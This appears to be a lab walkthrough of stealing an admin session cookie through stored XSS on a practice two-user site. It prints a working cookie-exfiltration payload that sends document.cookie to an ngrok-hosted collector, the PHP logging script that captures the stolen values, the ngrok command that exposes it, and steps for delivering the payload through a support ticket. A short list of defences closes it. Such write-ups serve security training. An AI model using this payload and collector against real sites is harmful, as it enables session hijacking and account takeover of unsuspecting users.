We are giving a website with 2 users

**_A normal user page :_**

**_An admin page_**

**The task here is to steal the Admin cookie via stored xss, so we can automatically be logged in as admin**

## **Understanding the flow**


- Starting with a basic XSS payload i wanted to understand the flow of this application, so i sent our payload to the **Admin** via the support ticket page of the normal user

- Navigating to the admin page and refreshing it, we truly have stored XSS

## **Preparing our Exploit**


- First of all since we will be using **Ngrok** as our server, we need to create a Script that will take the logs of our admin and save it to a `.txt` file every time he tries to login or refresh his browser made by [@Ravid11345277](https://twitter.com/Ravid11345277). As seen below we can save this PHP code in our file system with the extension `.php`

```PHP
<?php

$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
$ua=$_SERVER['HTTP_USER_AGENT'];


$fp=fopen('cookies.txt' , 'a+');

fwrite($fp, $ip.' '.$ua."\n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fclose($fp);

?>
```



- Now start up your **Ngrok** server with the following command, where the `PHP` file was saved

```bash
$ ngrok http 80
```

- Navigating to the normal user page we can craft the XSS payload that will steal the **Admin** user cookies by sending them to a remote server, which in this case is the `xss.php` file we created :

```js
<script> var i=new Image(); i.src="<NGROK-LINK-GOES-HERE>/xss.php?cookie="+document.cookie;</script>
```

- But just before we do anything let confirm if our **Ngrok** server is working by copying the forwarding link and calling the `PHP` file we created then, so your link should look like this

```
https://52c8-102-89-32-48.ngrok-free.app/{filename}.php
```

> **Note :** I added the `?test` parameter so i will see if it works when i navigate to `cookies.txt`

- Booyah, Navigating to `/cookies.txt` we can see our server is up and running, **P.N :** I blocked my public IP, you should know why ðŸ˜†

## **Launching Our Exploit**

Since we know things are good to go, we can take our malicious XSS payload and attempt to get the **admin** cookie in `/cookies.txt`

- Copy your malicious XSS payload and make sure to replace the `NGROK-LINK-GOES-HERE` with the right **Ngrok** server link, then we can **Submit** it to the **Admin**

```js
<script> var i=new Image(); i.src="<NGROK-LINK-GOES-HERE>/xss.php?admin_cookie="+document.cookie;</script>
```

- Navigating to the **Admin** page, we can refresh the page and we have `test 2` created already

- Referring back to `/cookies.txt` we have our admin cookie dumped

This doesn't only affect the admin user, every user cookie will automatically be dumped once there is a page refresh and we have an account takeover right there, there are various ways to prevent this kind of attacks, here are few


- **Input Validation and Sanitization**
- **Content Security Policy (CSP)**
- **Use Security Headers**
- **Web Application Firewall (WAF)**
- **Security Testing**
